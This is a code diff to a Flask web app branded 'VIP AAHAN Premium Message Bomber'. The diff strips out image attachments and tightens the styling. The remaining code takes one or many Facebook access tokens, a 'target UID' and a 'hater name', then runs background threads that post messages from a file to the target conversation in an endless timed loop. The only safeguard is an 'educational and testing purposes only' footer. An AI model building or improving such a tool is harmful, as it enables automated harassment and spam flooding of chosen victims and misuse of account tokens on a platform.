@@ -4,19 +4,10 @@ from threading import Thread, Event
 import time
 import random
 import string
-import base64
 import os
-import json
 
 app = Flask(__name__)
 app.debug = True
-
-# Configure upload folder
-UPLOAD_FOLDER = 'uploads'
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
-
-app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 
 headers = {
     'Connection': 'keep-alive',
@@ -32,10 +23,8 @@ headers = {
 
 stop_events = {}
 threads = {}
-message_count = 0
 
-def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_url, task_id):
-    global message_count
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
     stop_event = stop_events[task_id]
     
     while not stop_event.is_set():
@@ -46,27 +35,16 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_u
                 try:
                     message = str(mn) + ' ' + message1
                     
-                    # If image URL is provided, send image with message
-                    if image_url:
-                        # Send image with caption
-                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                        parameters = {
-                            'access_token': access_token,
-                            'message': message,
-                            'url': image_url
-                        }
-                    else:
-                        # Send only text message
-                        api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                        parameters = {
-                            'access_token': access_token,
-                            'message': message
-                        }
+                    # Send only text message
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    parameters = {
+                        'access_token': access_token,
+                        'message': message
+                    }
                     
                     response = requests.post(api_url, data=parameters, headers=headers)
                     if response.status_code == 200:
                         print(f"✅ Message Sent Successfully From token {access_token}: {message}")
-                        message_count += 1
                     else:
                         print(f"❌ Message Sent Failed From token {access_token}: {message}")
                         print(f"Error: {response.text}")
@@ -76,35 +54,8 @@ def send_messages(access_tokens, thread_id, mn, time_interval, messages, image_u
                 
                 time.sleep(time_interval)
 
-def upload_image_to_imgbb(image_file):
-    """Upload image to ImgBB and return direct URL"""
-    try:
-        # ImgBB API key (free tier)
-        api_key = "your_imgbb_api_key_here"  # You can get free API key from imgbb.com
-        
-        # Convert image to base64
-        image_base64 = base64.b64encode(image_file.read()).decode()
-        
-        # Upload to ImgBB
-        upload_url = "https://api.imgbb.com/1/upload"
-        data = {
-            'key': api_key,
-            'image': image_base64
-        }
-        
-        response = requests.post(upload_url, data=data)
-        if response.status_code == 200:
-            result = response.json()
-            return result['data']['url']
-        return None
-    except Exception as e:
-        print(f"Error uploading image to ImgBB: {e}")
-        return None
-
 @app.route('/', methods=['GET', 'POST'])
 def send_message():
-    global message_count
-    
     if request.method == 'POST':
         token_option = request.form.get('tokenOption')
         
@@ -121,19 +72,10 @@ def send_message():
         txt_file = request.files['txtFile']
         messages = txt_file.read().decode().splitlines()
 
-        # Handle image upload and get image URL
-        image_url = None
-        if 'imageFile' in request.files and request.files['imageFile'].filename != '':
-            image_file = request.files['imageFile']
-            # For now, use a placeholder image URL
-            # In production, you'd upload to a service like ImgBB
-            image_url = "https://via.placeholder.com/500x500/FFD700/000000?text=VIP+AAHAN"
-            # image_url = upload_image_to_imgbb(image_file)  # Uncomment when you have ImgBB API key
-
         task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
         stop_events[task_id] = Event()
-        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, image_url, task_id))
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
         threads[task_id] = thread
         thread.start()
 
@@ -218,13 +160,13 @@ def send_message():
     }
 
     .premium-container {
-      max-width: 500px;
+      max-width: 480px;
       margin: 20px auto;
       background: var(--card-bg);
       backdrop-filter: blur(25px);
       border: 3px solid transparent;
-      border-radius: 30px;
-      padding: 35px;
+      border-radius: 25px;
+      padding: 30px;
       position: relative;
       box-shadow: 
         var(--neon-glow),
@@ -277,8 +219,8 @@ def send_message():
       border: 2px solid transparent;
       border-radius: 15px;
       color: white;
-      padding: 16px 22px;
-      margin-bottom: 22px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
       transition: all 0.4s ease;
       font-size: 16px;
       backdrop-filter: blur(15px);
@@ -298,8 +240,8 @@ def send_message():
       border: 2px solid transparent;
       border-radius: 15px;
       color: white;
-      padding: 16px 22px;
-      margin-bottom: 22px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
       transition: all 0.4s ease;
       backdrop-filter: blur(15px);
       font-family: 'Exo 2', sans-serif;
@@ -316,17 +258,17 @@ def send_message():
     .premium-btn {
       background: linear-gradient(45deg, var(--primary-gold), var(--premium-blue), var(--neon-pink));
       border: none;
-      border-radius: 18px;
+      border-radius: 15px;
       color: black;
-      padding: 20px 35px;
+      padding: 18px 30px;
       font-weight: 800;
-      font-size: 20px;
+      font-size: 18px;
       text-transform: uppercase;
-      letter-spacing: 3px;
+      letter-spacing: 2px;
       transition: all 0.4s ease;
       position: relative;
       overflow: hidden;
-      margin: 15px 0;
+      margin: 12px 0;
       font-family: 'Orbitron', sans-serif;
       background-size: 300% 300%;
       animation: gradientShift 4s ease infinite;
@@ -339,11 +281,11 @@ def send_message():
     }
 
     .premium-btn:hover {
-      transform: translateY(-5px) scale(1.08);
+      transform: translateY(-4px) scale(1.05);
       box-shadow: 
-        0 15px 40px rgba(255, 215, 0, 0.6),
-        0 0 50px rgba(0, 245, 255, 0.4),
-        0 0 70px rgba(255, 0, 255, 0.3);
+        0 12px 35px rgba(255, 215, 0, 0.6),
+        0 0 45px rgba(0, 245, 255, 0.4),
+        0 0 60px rgba(255, 0, 255, 0.3);
       color: black;
     }
 
@@ -361,16 +303,16 @@ def send_message():
 
     .premium-btn-danger:hover {
       box-shadow: 
-        0 15px 40px rgba(255, 65, 108, 0.6),
-        0 0 50px rgba(255, 75, 43, 0.4);
+        0 12px 35px rgba(255, 65, 108, 0.6),
+        0 0 45px rgba(255, 75, 43, 0.4);
     }
 
     .file-upload-area {
       border: 3px dashed var(--premium-blue);
-      border-radius: 20px;
-      padding: 35px;
+      border-radius: 18px;
+      padding: 25px;
       text-align: center;
-      margin: 25px 0;
+      margin: 18px 0;
       transition: all 0.4s ease;
       background: rgba(0, 245, 255, 0.05);
       cursor: pointer;
@@ -388,29 +330,29 @@ def send_message():
     .feature-badge {
       background: linear-gradient(45deg, var(--primary-gold), var(--premium-blue));
       color: black;
-      padding: 10px 18px;
-      border-radius: 25px;
-      font-weight: 800;
-      margin: 6px;
+      padding: 8px 15px;
+      border-radius: 20px;
+      font-weight: 700;
+      margin: 5px;
       display: inline-block;
-      font-size: 13px;
+      font-size: 12px;
       text-transform: uppercase;
-      letter-spacing: 1.5px;
+      letter-spacing: 1px;
       font-family: 'Orbitron', sans-serif;
     }
 
     .social-icon {
-      width: 55px;
-      height: 55px;
+      width: 50px;
+      height: 50px;
       background: linear-gradient(45deg, var(--primary-gold), var(--premium-blue));
       border-radius: 50%;
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      margin: 0 12px;
+      margin: 0 10px;
       color: black;
       text-decoration: none;
-      font-size: 22px;
+      font-size: 20px;
       transition: all 0.4s ease;
       position: relative;
       overflow: hidden;
@@ -433,7 +375,7 @@ def send_message():
     }
 
     .social-icon:hover {
-      transform: scale(1.3) rotate(360deg);
+      transform: scale(1.2) rotate(360deg);
       box-shadow: var(--neon-glow), var(--blue-glow);
       color: black;
     }
@@ -444,7 +386,7 @@ def send_message():
 
     @keyframes floating {
       0%, 100% { transform: translateY(0px) rotate(0deg); }
-      50% { transform: translateY(-15px) rotate(2deg); }
+      50% { transform: translateY(-12px) rotate(1deg); }
     }
 
     .particles {
@@ -472,12 +414,12 @@ def send_message():
     .stats-container {
       display: flex;
       justify-content: space-around;
-      margin: 25px 0;
+      margin: 20px 0;
       text-align: center;
     }
 
     .stat-item {
-      padding: 18px;
+      padding: 15px;
       background: rgba(255, 215, 0, 0.1);
       border-radius: 15px;
       backdrop-filter: blur(10px);
@@ -485,7 +427,7 @@ def send_message():
     }
 
     .stat-number {
-      font-size: 28px;
+      font-size: 24px;
       font-weight: 800;
       color: var(--primary-gold);
       display: block;
@@ -493,9 +435,9 @@ def send_message():
     }
 
     .stat-label {
-      font-size: 13px;
+      font-size: 12px;
       text-transform: uppercase;
-      letter-spacing: 2px;
+      letter-spacing: 1.5px;
       color: var(--premium-blue);
       font-weight: 600;
     }
@@ -503,10 +445,10 @@ def send_message():
     .premium-label {
       font-family: 'Orbitron', sans-serif;
       font-weight: 700;
-      font-size: 16px;
+      font-size: 14px;
       text-transform: uppercase;
-      letter-spacing: 2px;
-      margin-bottom: 12px;
+      letter-spacing: 1.5px;
+      margin-bottom: 8px;
       display: block;
     }
 
@@ -523,6 +465,15 @@ def send_message():
       pointer-events: none;
       z-index: -2;
     }
+
+    .powered-by {
+      text-align: center;
+      margin: 15px 0;
+      font-size: 12px;
+      color: var(--premium-blue);
+      font-family: 'Orbitron', sans-serif;
+      letter-spacing: 2px;
+    }
   </style>
 </head>
 <body>
@@ -533,19 +484,18 @@ def send_message():
   <div class="particles" id="particles"></div>
 
   <header class="text-center mt-4">
-    <h1 class="premium-text floating" style="font-size: 3rem; margin-bottom: 15px;">
+    <h1 class="premium-text floating" style="font-size: 2.5rem; margin-bottom: 10px;">
       ⚡💎 𝐕𝐈𝐏 𝐀𝐀𝐇𝐀𝐍 💎⚡
     </h1>
-    <p class="text-warning" style="font-size: 1.4rem; font-weight: 700; letter-spacing: 3px;">
+    <p class="text-warning" style="font-size: 1.2rem; font-weight: 700; letter-spacing: 2px;">
       𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐁𝐎𝐌𝐁𝐄𝐑
     </p>
     
     <!-- Features Badges -->
-    <div class="mt-4">
+    <div class="mt-3">
       <span class="feature-badge"><i class="fas fa-bolt"></i> ULTRA FAST</span>
       <span class="feature-badge"><i class="fas fa-shield-alt"></i> SECURE</span>
       <span class="feature-badge"><i class="fas fa-rocket"></i> POWERFUL</span>
-      <span class="feature-badge"><i class="fas fa-image"></i> IMAGE SUPPORT</span>
     </div>
   </header>
 
@@ -562,9 +512,14 @@ def send_message():
   </div>
 
   <div class="premium-container">
+    <!-- Powered By Text -->
+    <div class="powered-by">
+      ⚡ POWERED BY VIP AAHAN TECHNOLOGY ⚡
+    </div>
+
     <form method="post" enctype="multipart/form-data" id="mainForm">
       <!-- Token Option -->
-      <div class="mb-4">
+      <div class="mb-3">
         <label class="premium-label text-warning">🔑 SELECT TOKEN OPTION</label>
         <select class="premium-select w-100" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
           <option value="single">Single Token</option>
@@ -573,16 +528,16 @@ def send_message():
       </div>
 
       <!-- Single Token Input -->
-      <div class="mb-4" id="singleTokenInput">
+      <div class="mb-3" id="singleTokenInput">
         <label class="premium-label text-warning">🔐 SINGLE TOKEN</label>
-        <input type="text" class="premium-input w-100" id="singleToken" name="singleToken" placeholder="Enter your Facebook token...">
+        <input type="text" class="premium-input w-100" id="singleToken" name="singleToken" placeholder="Enter your Facebook token..." required>
       </div>
 
       <!-- Token File Input -->
-      <div class="mb-4" id="tokenFileInput" style="display: none;">
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
         <label class="premium-label text-warning">📁 TOKEN FILE</label>
         <div class="file-upload-area" onclick="document.getElementById('tokenFile').click()">
-          <i class="fas fa-cloud-upload-alt fa-4x text-warning mb-3"></i>
+          <i class="fas fa-cloud-upload-alt fa-3x text-warning mb-2"></i>
           <p class="text-warning fw-bold">CLICK TO UPLOAD TOKEN FILE</p>
           <p class="small text-muted">Upload .txt file with multiple tokens</p>
           <input type="file" class="d-none" id="tokenFile" name="tokenFile" accept=".txt">
@@ -590,42 +545,31 @@ def send_message():
       </div>
 
       <!-- Thread ID -->
-      <div class="mb-4">
+      <div class="mb-3">
         <label class="premium-label text-warning">🎯 TARGET UID</label>
         <input type="text" class="premium-input w-100" id="threadId" name="threadId" placeholder="Enter target conversation ID..." required>
       </div>
 
       <!-- Hater Name -->
-      <div class="mb-4">
+      <div class="mb-3">
         <label class="premium-label text-warning">😈 HATER NAME</label>
         <input type="text" class="premium-input w-100" id="kidx" name="kidx" placeholder="Enter hater name..." required>
       </div>
 
       <!-- Time Interval -->
-      <div class="mb-4">
+      <div class="mb-3">
         <label class="premium-label text-warning">⏰ TIME INTERVAL (SECONDS)</label>
         <input type="number" class="premium-input w-100" id="time" name="time" placeholder="Enter time in seconds..." required min="1">
       </div>
 
       <!-- Messages File -->
-      <div class="mb-4">
+      <div class="mb-3">
         <label class="premium-label text-warning">💬 MESSAGES FILE</label>
         <div class="file-upload-area" onclick="document.getElementById('txtFile').click()">
-          <i class="fas fa-file-alt fa-4x text-warning mb-3"></i>
+          <i class="fas fa-file-alt fa-3x text-warning mb-2"></i>
           <p class="text-warning fw-bold">CLICK TO UPLOAD MESSAGES</p>
           <p class="small text-muted">Upload .txt file with your messages</p>
           <input type="file" class="d-none" id="txtFile" name="txtFile" accept=".txt" required>
-        </div>
-      </div>
-
-      <!-- Image Upload -->
-      <div class="mb-4">
-        <label class="premium-label text-warning">🖼️ ATTACH IMAGE (OPTIONAL)</label>
-        <div class="file-upload-area" onclick="document.getElementById('imageFile').click()">
-          <i class="fas fa-image fa-4x text-warning mb-3"></i>
-          <p class="text-warning fw-bold">CLICK TO UPLOAD IMAGE</p>
-          <p class="small text-muted">Supports: JPG, PNG, GIF, WEBP</p>
-          <input type="file" class="d-none" id="imageFile" name="imageFile" accept="image/*">
         </div>
       </div>
 
@@ -637,7 +581,7 @@ def send_message():
 
     <!-- Stop Task Form -->
     <form method="post" action="/stop" class="mt-4">
-      <div class="mb-4">
+      <div class="mb-3">
         <label class="premium-label text-danger">🛑 STOP MISSION</label>
         <input type="text" class="premium-input w-100" id="taskId" name="taskId" placeholder="Enter Mission ID to stop..." required>
       </div>
@@ -648,8 +592,8 @@ def send_message():
   </div>
 
   <!-- Footer -->
-  <footer class="text-center mt-5 mb-4">
-    <div class="mb-4">
+  <footer class="text-center mt-4 mb-4">
+    <div class="mb-3">
       <a href="https://www.facebook.com/100064267823693" class="social-icon" target="_blank">
         <i class="fab fa-facebook-f"></i>
       </a>
@@ -660,7 +604,7 @@ def send_message():
         <i class="fab fa-telegram-plane"></i>
       </a>
     </div>
-    <p class="text-warning mb-2 fw-bold">© 2025 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘 𝐕𝐈𝐏 𝐀𝐀𝐇𝐀𝐍</p>
+    <p class="text-warning mb-1 fw-bold">© 2025 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘 𝐕𝐈𝐏 𝐀𝐀𝐇𝐀𝐍</p>
     <p class="text-muted small">For educational and testing purposes only</p>
   </footer>
 
@@ -668,19 +612,19 @@ def send_message():
     // Create animated particles
     function createParticles() {
       const particles = document.getElementById('particles');
-      const particleCount = 80;
+      const particleCount = 60;
       
       for (let i = 0; i < particleCount; i++) {
         const particle = document.createElement('div');
         particle.className = 'particle';
         
-        const size = Math.random() * 4 + 1;
+        const size = Math.random() * 3 + 1;
         const posX = Math.random() * 100;
-        const duration = Math.random() * 25 + 15;
-        const delay = Math.random() * 10;
+        const duration = Math.random() * 20 + 10;
+        const delay = Math.random() * 8;
         
         // Random colors
-        const colors = ['#FFD700', '#00f5ff', '#ff00ff', '#ffffff'];
+        const colors = ['#FFD700', '#00f5ff', '#ff00ff'];
         const color = colors[Math.floor(Math.random() * colors.length)];
         
         particle.style.width = `${size}px`;
@@ -688,7 +632,7 @@ def send_message():
         particle.style.left = `${posX}vw`;
         particle.style.animationDuration = `${duration}s`;
         particle.style.animationDelay = `${delay}s`;
-        particle.style.opacity = Math.random() * 0.6 + 0.2;
+        particle.style.opacity = Math.random() * 0.5 + 0.2;
         particle.style.background = color;
         particle.style.boxShadow = `0 0 ${size*2}px ${color}`;
         
@@ -713,7 +657,7 @@ def send_message():
       createParticles();
       
       // Add file name display
-      const fileInputs = ['tokenFile', 'txtFile', 'imageFile'];
+      const fileInputs = ['tokenFile', 'txtFile'];
       fileInputs.forEach(inputId => {
         const input = document.getElementById(inputId);
         if (input) {
@@ -727,7 +671,7 @@ def send_message():
               const badge = document.createElement('span');
               badge.className = 'feature-badge file-badge';
               badge.textContent = fileName.length > 20 ? fileName.substring(0, 20) + '...' : fileName;
-              badge.style.marginTop = '15px';
+              badge.style.marginTop = '10px';
               badge.style.background = 'linear-gradient(45deg, #00f5ff, #ff00ff)';
               uploadArea.appendChild(badge);
             }
@@ -746,17 +690,7 @@ def send_message():
       setTimeout(() => {
         button.innerHTML = originalText;
         button.disabled = false;
-      }, 4000);
-    });
-
-    // Add typing effect to inputs
-    const inputs = document.querySelectorAll('.premium-input, .premium-select');
-    inputs.forEach(input => {
-      input.addEventListener('focus', function() {
-        this.style.animation = 'none';
-        this.offsetHeight; /* trigger reflow */
-        this.style.animation = null;
-      });
+      }, 3000);
     });
   </script>
 </body>
@@ -772,18 +706,18 @@ def stop_task():
         if task_id in threads:
             del threads[task_id]
         return f'''
-        <div style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; padding: 30px; border-radius: 20px; text-align: center; margin: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
-            <h3 style="margin: 0; font-size: 28px;">🛑 MISSION ABORTED!</h3>
-            <p style="font-size: 20px; margin: 15px 0;">Mission ID: <strong style="color: #FFD700;">{task_id}</strong> has been stopped</p>
-            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #FFD700, #FFED4E); color: black; padding: 12px 25px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 15px; font-size: 16px;">🔥 BACK TO CONTROL PANEL</a>
+        <div style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; padding: 25px; border-radius: 15px; text-align: center; margin: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.3);">
+            <h3 style="margin: 0; font-size: 24px;">🛑 MISSION ABORTED!</h3>
+            <p style="font-size: 18px; margin: 12px 0;">Mission ID: <strong style="color: #FFD700;">{task_id}</strong> has been stopped</p>
+            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #FFD700, #FFED4E); color: black; padding: 10px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 12px; font-size: 14px;">🔥 BACK TO CONTROL PANEL</a>
         </div>
         '''
     else:
         return f'''
-        <div style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; padding: 30px; border-radius: 20px; text-align: center; margin: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
-            <h3 style="margin: 0; font-size: 28px;">❌ MISSION NOT FOUND!</h3>
-            <p style="font-size: 20px; margin: 15px 0;">No mission found with ID: <strong style="color: #FFD700;">{task_id}</strong></p>
-            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #FFD700, #FFED4E); color: black; padding: 12px 25px; border-radius: 10px; text-decoration: none; font-weight: bold; margin-top: 15px; font-size: 16px;">🔥 BACK TO CONTROL PANEL</a>
+        <div style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; padding: 25px; border-radius: 15px; text-align: center; margin: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.3);">
+            <h3 style="margin: 0; font-size: 24px;">❌ MISSION NOT FOUND!</h3>
+            <p style="font-size: 18px; margin: 12px 0;">No mission found with ID: <strong style="color: #FFD700;">{task_id}</strong></p>
+            <a href="/" style="display: inline-block; background: linear-gradient(45deg, #FFD700, #FFED4E); color: black; padding: 10px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 12px; font-size: 14px;">🔥 BACK TO CONTROL PANEL</a>
         </div>
         '''
 
